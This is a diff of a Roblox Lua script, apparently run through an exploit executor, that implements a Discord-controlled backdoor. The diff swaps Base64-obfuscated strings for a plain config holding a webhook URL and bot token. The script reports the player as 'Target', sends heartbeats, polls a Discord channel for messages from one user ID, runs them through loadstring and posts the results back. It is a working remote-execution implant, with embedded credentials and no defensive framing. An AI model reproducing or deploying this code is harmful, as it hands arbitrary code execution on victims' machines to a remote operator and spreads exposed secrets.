@@ -1,45 +1,84 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LP = Players.LocalPlayer
-local req = (syn and syn.request) or (http and http.request) or HttpService.RequestAsync
-local wUrl = HttpService:Base64Decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4Mjc4MDg3MjY4MzAyODYzMS9SdUpwanBLSmVaWk1yaDBYbF93S2VWZ3pPdHpsd0RHU0ppS2dPbVZPczRac3RsTGlrM3c0ekZfbzV4UTh5OUlJX3p6")
-local cId = HttpService:Base64Decode("MTQ4Mjc3ODM2MzEyMTc2NjQ5Mg==")
-local uId = HttpService:Base64Decode("MTM5NDM3NTcxMDI3NzI0MjkyMg==")
-local bTk = HttpService:Base64Decode("TVRVMk5EQTJNREUwTXpZeE9EZzROelk0TUEuR2cwZmZDLmFzb3pzemVJWFBLVUdUNXAyc3JlaUVwaG5MOTU0LUVqMC01amFF")
-local lMsg = "0"
-local function sLog(title, desc, color) pcall(function() req({Url = wUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({embeds = {{title = title, description = "```lua\n" .. tostring(desc) .. "\n```", color = color or 3447003}}})}) end) end
-local function cStr(s) local c = s:gsub("```lua", ""):gsub("```", "") return c:match("^%s*(.-)%s*$") end
-sLog("Connected", "Target: " .. LP.Name .. "\nListening...", 65280)
-task.spawn(function() while true do task.wait(10) sLog("Alive", "", 3066993) end end)
-task.spawn(function() while true do
-    local s, r = pcall(function()
-        local u = "https://discord.com/api/v10/channels/" .. cId .. "/messages?limit=1"
-        return req({Url = u, Method = "GET", Headers = {["Authorization"] = "Bot " .. bTk}})
+
+local request = (syn and syn.request) or (http and http.request) or HttpService.RequestAsync
+
+local CONFIG = {
+    Webhook = "https://discord.com/api/webhooks/1482780872683028631/RuJpjpKJeZhMrh0Xl_wKeVgzOtzlwDGSJiKgOmVOs4ZstLlIk3w4zF_o5xQ98y9I_Izk",
+    Channel = "1482778363121766492",
+    UserID = "1394375710277242922",
+    BotToken = "MTU2NDA2MDE0MzYxODg4NzY4MA.Gg0ffC.asozszeIXPKUGT5p2sreiEphnL954-Ej0-5jaE"
+}
+
+local lastMessage = "0"
+
+local function sendLog(title, content, color)
+    pcall(function()
+        request({
+            Url = CONFIG.Webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                embeds = {{
+                    title = title,
+                    description = "```text\n" .. tostring(content) .. "\n```",
+                    color = color or 3447003
+                }}
+            })
+        })
     end)
-    if s and r and r.Body then
-        local o, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
-        if o and type(d) == "table" and #d > 0 then
-            local m = d[1]
-            if m.id ~= lMsg and tostring(m.author.id) == uId then
-                lMsg = m.id
-                local cmd = cStr(m.content)
-                if cmd ~= "" then
-                    task.spawn(function()
-                        local f, err = loadstring(cmd)
-                        if not f then
-                            sLog("Syntax Error", err, 15158332)
-                            return
-                        end
-                        local ok, res = pcall(f)
-                        if ok then
-                            sLog("Success", res, 15158332)
-                        else
-                            sLog("Runtime Error", res, 15158332)
-                        end
-                    end)
+end
+
+local function cleanString(str)
+    local cleaned = str:gsub("```lua", ""):gsub("```", "")
+    return cleaned:match("^%s*(.-)%s*$")
+end
+
+-- 启动上报
+sendLog("Terminal Status", "Connection established.\nTarget: " .. LP.Name .. "\nAwaiting payload...", 65280)
+
+-- 心跳包 (15秒一次)
+task.spawn(function()
+    while true do
+        task.wait(15)
+        sendLog("Status", "Alive", 3066993)
+    end
+end)
+
+-- 指令拉取与执行
+task.spawn(function()
+    while true do
+        local success, res = pcall(function()
+            local url = "https://discord.com/api/v10/channels/" .. CONFIG.Channel .. "/messages?limit=1"
+            return request({Url = url, Method = "GET", Headers = {["Authorization"] = "Bot " .. CONFIG.BotToken}})
+        end)
+
+        if success and res and res.Body then
+            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+            if ok and type(data) == "table" and #data > 0 then
+                local msg = data[1]
+                if msg.id ~= lastMessage and tostring(msg.author.id) == CONFIG.UserID then
+                    lastMessage = msg.id
+                    local cmd = cleanString(msg.content)
+                    if cmd ~= "" then
+                        task.spawn(function()
+                            local func, loadErr = loadstring(cmd)
+                            if not func then
+                                sendLog("Execution Error", "Syntax Error:\n" .. tostring(loadErr), 15158332)
+                                return
+                            end
+                            local success_run, result = pcall(func)
+                            if success_run then
+                                sendLog("Execution Success", tostring(result), 65280)
+                            else
+                                sendLog("Runtime Error", tostring(result), 15158332)
+                            end
+                        end)
+                    end
                 end
             end
         end
+        task.wait(2)
     end
-    task.wait(2)
-end end)
+end)
